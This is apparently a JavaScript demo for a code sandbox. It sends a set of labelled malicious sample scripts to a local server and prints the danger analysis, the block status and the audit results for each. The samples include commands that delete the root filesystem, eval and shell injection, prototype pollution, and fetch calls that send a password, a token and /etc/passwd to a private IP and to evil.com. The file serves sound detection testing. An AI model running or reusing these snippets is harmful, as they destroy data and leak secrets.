/**
 * SandboxAI Example: Dangerous Script Detection & Auditing
 * Demonstrates how SandboxAI identifies and handles malicious code
 */

const http = require("node:http");

// Collection of dangerous scripts for testing detection
const DANGEROUS_SCRIPTS = [
  {
    name: "Code Injection (eval)",
    category: "codeInjection",
    severity: "critical",
    code: `
// Attempting code injection via eval
const userInput = "process.exit(1)";
eval(userInput);
console.log("This should not run");
`
  },
  {
    name: "Process Spawning",
    category: "processSpawning",
    severity: "critical",
    code: `
// Attempting to spawn a shell process
const { exec } = require('child_process');
exec('ls -la /', (err, stdout) => {
  console.log(stdout);
});
`
  },
  {
    name: "Shell Command Injection",
    category: "shellExecution",
    severity: "critical",
    code: `
// Dangerous shell command
const cmd = "bash -c 'rm -rf /tmp/data'";
console.log("Command prepared:", cmd);
`
  },
  {
    name: "Filesystem Destruction",
    category: "filesystemDestruction",
    severity: "high",
    code: `
// Attempting to delete root directory
const fs = require('fs');
fs.rmdirSync('/', { recursive: true });
`
  },
  {
    name: "Data Exfiltration",
    category: "networkExfiltration",
    severity: "high",
    code: `
// Attempting to exfiltrate data
const data = { password: "secret123", token: "abc" };
fetch('http://192.168.1.100/steal?data=' + JSON.stringify(data));
`
  },
  {
    name: "Prototype Pollution",
    category: "prototypePollution",
    severity: "high",
    code: `
// Prototype pollution attack
Object.prototype.__proto__.isAdmin = true;
console.log("Polluted prototype");
`
  },
  {
    name: "Worker Threads",
    category: "workerThreads",
    severity: "medium",
    code: `
// Attempting to use worker threads
const { Worker } = require('worker_threads');
new Worker('console.log("worker")');
`
  },
  {
    name: "VM Module Access",
    category: "vmModule",
    severity: "high",
    code: `
// Attempting to use VM module
const vm = require('vm');
vm.runInNewContext('process.exit(1)');
`
  },
  {
    name: "Native Module Loading",
    category: "nativeModules",
    severity: "medium",
    code: `
// Attempting to load native addon
const addon = require('./evil-addon.node');
addon.exploit();
`
  },
  {
    name: "System Reconnaissance",
    category: "reconnaissance",
    severity: "low",
    code: `
// Gathering system information
const os = require('os');
console.log("Hostname:", os.hostname());
console.log("User:", process.env.USER);
console.log("Home:", process.env.HOME);
`
  },
  {
    name: "Memory Exhaustion",
    category: "memoryExhaustion",
    severity: "medium",
    code: `
// Attempting memory exhaustion
const huge = Array(1000000000).fill('x');
console.log(huge.length);
`
  },
  {
    name: "Crypto Mining Pattern",
    category: "cryptoMining",
    severity: "high",
    code: `
// Suspicious crypto pattern
const crypto = require('crypto');
for (let i = 0; i < 1000000; i++) {
  crypto.createHash('sha256').update(String(i)).digest('hex');
}
`
  },
  {
    name: "Multi-Vector Attack",
    category: "multiple",
    severity: "critical",
    code: `
// Multiple attack vectors combined
const { exec } = require('child_process');
const fs = require('fs');

// Exfiltrate then destroy
const data = fs.readFileSync('/etc/passwd');
fetch('http://evil.com/steal?d=' + data);

// Cleanup
eval("exec('rm -rf /')");
`
  }
];

const SAFE_SCRIPT = {
  name: "Safe Computation",
  category: "safe",
  severity: "none",
  code: `
// Normal safe computation
const fib = (n) => n < 2 ? n : fib(n - 1) + fib(n - 2);
console.log("Fib(10):", fib(10));

const data = [1, 2, 3, 4, 5];
const sum = data.reduce((a, b) => a + b, 0);
console.log("Sum:", sum);
`
};

function makeRequest(path, data) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: "localhost",
      port: 3000,
      path,
      method: "POST",
      headers: { "Content-Type": "application/json" }
    }, (res) => {
      let body = "";
      res.on("data", chunk => body += chunk);
      res.on("end", () => {
        try {
          resolve(JSON.parse(body));
        } catch {
          resolve(body);
        }
      });
    });

    req.on("error", reject);
    if (data) req.write(JSON.stringify(data));
    req.end();
  });
}

async function analyzeScript(script) {
  console.log(`\\n${"=".repeat(60)}`);
  console.log(`Testing: ${script.name}`);
  console.log(`Category: ${script.category} | Severity: ${script.severity}`);
  console.log("-".repeat(60));

  // First, analyze the code
  const analysis = await makeRequest("/mcp/tools/analyze", {
    code: script.code,
    policy: "standard"
  });

  if (analysis.analysis) {
    const danger = analysis.analysis;
    console.log("\\n🛡️  DANGER ANALYSIS:");
    console.log(`   Risk Score: ${danger.riskScore}/100 (${danger.riskLevel})`);
    console.log(`   Is Dangerous: ${danger.isDangerous ? "YES ⚠️" : "NO ✓"}`);
    
    if (danger.findings.length > 0) {
      console.log("\\n   Findings:");
      danger.findings.forEach(f => {
        console.log(`   • [${f.severity.toUpperCase()}] ${f.category}: ${f.description}`);
      });
    }
  }

  // Then try to execute
  console.log("\\n▶️  EXECUTION ATTEMPT:");
  const result = await makeRequest("/api/execute", {
    code: script.code,
    engine: "v8",
    policy: "standard"
  });

  console.log(`   Status: ${result.status.toUpperCase()}`);
  console.log(`   Duration: ${result.duration_ms}ms`);
  
  if (result.status === "rejected") {
    console.log(`   ❌ BLOCKED - Violations: ${result.violations.join(", ")}`);
  } else if (result.status === "error") {
    console.log(`   ⚠️  ERROR - ${result.error}`);
  } else {
    console.log(`   ✅ COMPLETED`);
    if (result.output) console.log(`   Output: ${result.output.trim()}`);
  }

  // Get audit for this execution
  if (result.id) {
    const audit = await makeRequest(`/api/audit/execution/${result.id}`, null);
    if (audit && audit.securityFindings) {
      console.log(`\\n📋 AUDIT: ${audit.securityFindings.length} security findings logged`);
    }
  }

  return result;
}

async function runSecurityDemo() {
  console.log("╔══════════════════════════════════════════════════════════════╗");
  console.log("║     SandboxAI Dangerous Script Detection Demo               ║");
  console.log("╚══════════════════════════════════════════════════════════════╝");

  // Test safe script first
  console.log("\\n🔵 PHASE 1: Testing SAFE script");
  await analyzeScript(SAFE_SCRIPT);

  // Test dangerous scripts
  console.log("\\n\\n🔴 PHASE 2: Testing DANGEROUS scripts");
  
  for (const script of DANGEROUS_SCRIPTS.slice(0, 5)) {
    await analyzeScript(script);
    await new Promise(r => setTimeout(r, 500));
  }

  // Get security summary
  console.log(`\\n${"=".repeat(60)}`);
  console.log("📊 SECURITY SUMMARY");
  console.log("-".repeat(60));

  const summary = await makeRequest("/api/audit/security-summary", null);
  if (summary) {
    console.log(`Total Executions: ${summary.totalExecutions}`);
    console.log(`Dangerous Detected: ${summary.dangerousExecutions}`);
    console.log(`Blocked: ${summary.blockedExecutions}`);
    console.log("\\nFindings by Severity:");
    console.log(`  Critical: ${summary.findingsBySeverity?.critical || 0}`);
    console.log(`  High: ${summary.findingsBySeverity?.high || 0}`);
    console.log(`  Medium: ${summary.findingsBySeverity?.medium || 0}`);
    console.log(`  Low: ${summary.findingsBySeverity?.low || 0}`);
  }

  console.log("\\n✅ Demo complete!");
}

// Check if server is running
http.get("http://localhost:3000/api/stats", (res) => {
  runSecurityDemo().catch(console.error);
}).on("error", () => {
  console.error("❌ Server not running. Start it first with: node server.js");
  process.exit(1);
});
